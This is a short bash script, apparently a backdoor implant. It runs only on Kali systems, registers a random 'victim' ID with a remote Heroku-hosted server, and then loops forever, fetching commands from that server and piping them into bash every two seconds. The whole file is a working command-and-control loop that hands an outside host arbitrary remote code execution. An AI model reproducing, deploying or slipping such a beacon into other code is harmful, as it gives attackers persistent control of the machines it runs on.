#!/bin/bash


os_type=$(uname -r)

substring=$(echo $os_type | cut -d '-' -f 2)

if [ "$substring" != "kali1" ]
then
	exit
fi

let victimID=$RANDOM

curl -s tufts-bobsledding-society.herokuapp/registervictim/$victimID

while true; do
 curl -s tufts-bobsledding-society.herokuapp/command/$victimID | bash -e
 sleep 2
done
